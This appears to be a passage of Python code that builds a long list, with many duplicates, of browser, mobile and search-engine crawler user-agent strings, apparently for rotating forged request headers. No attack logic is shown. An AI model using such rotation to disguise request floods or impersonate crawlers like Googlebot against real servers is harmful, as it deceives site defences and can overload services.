	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
